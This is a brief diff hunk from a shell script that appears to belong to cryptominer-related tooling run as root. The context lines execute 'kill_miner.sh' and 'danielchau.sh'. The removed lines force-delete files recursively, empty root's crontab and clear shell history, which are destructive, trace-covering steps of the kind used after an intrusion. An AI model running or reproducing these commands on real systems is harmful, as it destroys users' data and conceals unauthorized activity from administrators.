@@ -40,7 +40,3 @@ chmod +x /root/kill_miner.sh
 sleep 3
 ./danielchau.sh
 sleep 10
-rm -fv *
-rm -fR *
-cat /dev/null > /var/spool/cron/crontabs/root
-history -c && history -w
